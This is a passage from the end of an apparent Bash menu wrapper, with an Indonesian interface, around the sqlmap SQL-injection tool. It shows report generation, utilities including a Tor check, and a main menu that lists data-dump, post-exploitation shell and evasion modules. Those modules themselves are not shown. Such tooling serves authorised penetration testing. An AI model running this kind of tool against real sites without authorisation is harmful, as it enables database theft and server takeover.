      6) DBMS="$(ask 'DBMS (mysql/mssql/postgresql/oracle/sqlite)' "$DBMS")" ;;
      7) EVAL_EXPR="$(ask '--eval python code' "$EVAL_EXPR")" ;;
      8) EXTRA_ARGS="$(ask 'Raw args (mis: --tamper=... --random-agent)' "$EXTRA_ARGS")" ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 6: REPORTS & LOGS
# ─────────────────────────────────────────────────────────────────────────────
menu_reports() {
  while :; do
    banner "MODUL 6: REPORTS & LOGS"
    cat <<EOF

  ${C}1)${N} Lihat Activity Log     ${D}(tail 200)${N}
  ${C}2)${N} Generate Markdown      ${D}(report_*.md)${N}
  ${C}3)${N} Generate JSON          ${D}(report_*.json)${N}
  ${C}4)${N} Generate HTML          ${D}(styled)${N}
  ${C}5)${N} Buka Folder Output     ${D}(ls -la)${N}
  ${C}6)${N} Bersihkan Log/Sesi     ${D}(reset)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1) tail -n 200 "$LOG_FILE" 2>/dev/null || echo -e "  ${WARN} Log kosong." ;;
      2)
        local out="${REPORTS_DIR}/report_$(date '+%Y%m%d_%H%M%S').md"
        {
          printf '# SQLMap Pentest Report\n\n'
          printf -- '- **Tool**: %s v%s\n' "$TOOL_NAME" "$VERSION"
          printf -- '- **Target**: %s\n' "$TARGET_URL"
          printf -- '- **Method**: %s\n' "$TARGET_METHOD"
          printf -- '- **Date**: %s\n' "$(date)"
          printf -- '- **Level/Risk/Threads**: %s/%s/%s\n' "$LEVEL" "$RISK" "$THREADS"
          printf -- '- **DBMS**: %s\n\n' "${DBMS:-auto}"
          printf '## Command History\n\n```\n'
          tail -n 500 "$LOG_FILE" 2>/dev/null
          printf '\n```\n'
        } > "$out"
        echo -e "  ${OK} Markdown: ${G}$out${N}"
        ;;
      3)
        local out="${REPORTS_DIR}/report_$(date '+%Y%m%d_%H%M%S').json"
        local jqbin; jqbin="$(command -v jq || true)"
        if [[ -n "$jqbin" ]]; then
          "$jqbin" -n \
            --arg tool "$TOOL_NAME" --arg ver "$VERSION" \
            --arg url  "$TARGET_URL" --arg method "$TARGET_METHOD" \
            --arg dbms "${DBMS:-auto}" --argjson level "$LEVEL" \
            --argjson risk "$RISK" --argjson threads "$THREADS" \
            --arg ts "$(date -Iseconds)" \
            '{tool:$tool,version:$ver,target:$url,method:$method,dbms:$dbms,level:$level,risk:$risk,threads:$threads,generated:$ts}' \
            > "$out"
        else
          printf '{"tool":"%s","version":"%s","target":"%s","method":"%s"}\n' \
            "$TOOL_NAME" "$VERSION" "$TARGET_URL" "$TARGET_METHOD" > "$out"
        fi
        echo -e "  ${OK} JSON: ${G}$out${N}"
        ;;
      4)
        local out="${REPORTS_DIR}/report_$(date '+%Y%m%d_%H%M%S').html"
        {
          printf '<!DOCTYPE html><html><head><meta charset="utf-8"><title>SQLMap Report</title>\n'
          printf '<style>body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:2em}'
          printf 'h1{color:#58a6ff}pre{background:#161b22;padding:1em;overflow-x:auto;border:1px solid #30363d;border-radius:6px}'
          printf 'table{border-collapse:collapse;margin:1em 0}td,th{border:1px solid #30363d;padding:.5em 1em}</style></head><body>\n'
          printf '<h1>SQLMap Pentest Report</h1><table>'
          printf '<tr><th>Tool</th><td>%s v%s</td></tr>' "$TOOL_NAME" "$VERSION"
          printf '<tr><th>Target</th><td>%s</td></tr>' "$TARGET_URL"
          printf '<tr><th>Method</th><td>%s</td></tr>' "$TARGET_METHOD"
          printf '<tr><th>Level/Risk/Threads</th><td>%s/%s/%s</td></tr>' "$LEVEL" "$RISK" "$THREADS"
          printf '<tr><th>DBMS</th><td>%s</td></tr>' "${DBMS:-auto}"
          printf '<tr><th>Date</th><td>%s</td></tr></table>\n' "$(date)"
          printf '<h2>Command History</h2><pre>'
          tail -n 500 "$LOG_FILE" 2>/dev/null | sed 's/</\&lt;/g;s/>/\&gt;/g'
          printf '</pre></body></html>\n'
        } > "$out"
        echo -e "  ${OK} HTML: ${G}$out${N}"
        ;;
      5)
        echo -e "  ${INFO} Output dir: ${G}${OUTPUT_DIR:-<unset>}${N}"
        echo -e "  ${INFO} Dump  dir: ${G}${DUMP_DIR:-<unset>}${N}"
        [[ -d "$OUTPUT_DIR" ]] && ls -la "$OUTPUT_DIR" || true
        ;;
      6)
        confirm "  Hapus log & session file?" "RESET" || continue
        rm -f "$LOG_FILE" "$SESSION_FILE"
        echo -e "  ${OK} Dibersihkan."
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU 7: UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
menu_utils() {
  while :; do
    banner "MODUL 7: UTILITIES"
    cat <<EOF

  ${C}1)${N} Update SQLMap          ${D}(sqlmap --update)${N}
  ${C}2)${N} Version Info           ${D}(sqlmap --version)${N}
  ${C}3)${N} Show All SQLMap Flags  ${D}(help excerpt)${N}
  ${C}4)${N} Clear Output Dir       ${D}(rm -rf output/*)${N}
  ${C}5)${N} Test Tor Connection    ${D}(check tor status)${N}
  ${C}k)${N} Kembali
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      1) sqlmap --update ;;
      2) sqlmap --version ;;
      3) sqlmap -hh | head -200 ;;
      4)
        confirm "  Hapus cache di $OUTPUT_DIR?" "CLEAR" || continue
        rm -rf "${OUTPUT_DIR:?}"/* 2>/dev/null || true
        echo -e "  ${OK} Dibersihkan."
        ;;
      5)
        if curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null | grep -q 'IsTor.*true'; then
          echo -e "  ${OK} Tor aktif."
        else
          echo -e "  ${WARN} Tor tidak aktif di 127.0.0.1:9050."
        fi
        ;;
      k|K) return ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ;;
    esac
    press_enter
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  MENU UTAMA
# ─────────────────────────────────────────────────────────────────────────────
main_menu() {
  while :; do
    banner "SQLMAP_KIT v$VERSION — MAIN"
    show_session
    hr
    cat <<EOF

  ${C}s)${N} ${G}Setup Target & Environment${N}
  ${C}l)${N} Load Last Session
  ${D}─────────────────────────────────────────────────────${N}
  ${C}1)${N} ${Y}Recon & Vuln Scanner${N}      ${D}(WAF/XSS/LFI/Nmap/Headers)${N}
  ${C}2)${N} ${Y}SQL Injection & Enumeration${N}
  ${C}3)${N} ${R}Data Extraction (Dump)${N}
  ${C}4)${N} ${M}Post-Exploitation${N}          ${D}(shell/upload/os-cmd)${N}
  ${C}5)${N} Advanced & Evasion         ${D}(proxy/tor/auth/tamper)${N}
  ${C}6)${N} Reports & Logs
  ${C}7)${N} Utilities
  ${D}─────────────────────────────────────────────────────${N}
  ${C}!${N} Exit
EOF
    hr
    read -rp "  ${C}${AUTHOR} ▸${N} " c </dev/tty || return
    case "$c" in
      s|S) setup_target ;;
      l|L) load_session || true; press_enter ;;
      1) menu_recon ;;
      2) menu_sqli ;;
      3) menu_dump ;;
      4) menu_post ;;
      5) menu_advanced ;;
      6) menu_reports ;;
      7) menu_utils ;;
      "!"|q|Q|quit|exit)
        echo -e "\n  ${OK} Sampai jumpa!"; log INFO "exit"; exit 0 ;;
      *) echo -e "  ${ERR} Pilihan tidak valid." ; sleep 1 ;;
    esac
  done
}

# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
main() {
  case "${1:-}" in
    --check) banner "DEPENDENCY CHECK"; check_deps && echo -e "\n  ${OK} Siap!"; exit $? ;;
    --help|-h)
      banner "HELP"
      cat <<EOF
  Usage: $0 [opsi]
    (kosong)     Mode interaktif
    --check      Cek dependensi
    --help       Bantuan ini
EOF
      exit 0 ;;
  esac

  rotate_log
  clear
  type_effect "  [*] Menginisialisasi SQLMAP_KIT v$VERSION..." 0.01
  type_effect "  [*] Memuat antarmuka..." 0.01
  sleep 0.3

  check_deps || { echo -e "\n  ${ERR} Install dependensi dulu."; exit 1; }

  if [[ -f "$SESSION_FILE" ]]; then
    echo -e "\n  ${INFO} Sesi sebelumnya ditemukan."
    if yes_no "  Muat?" Y; then load_session; else setup_target; fi
  else
    setup_target
  fi

  main_menu
}

main "$@"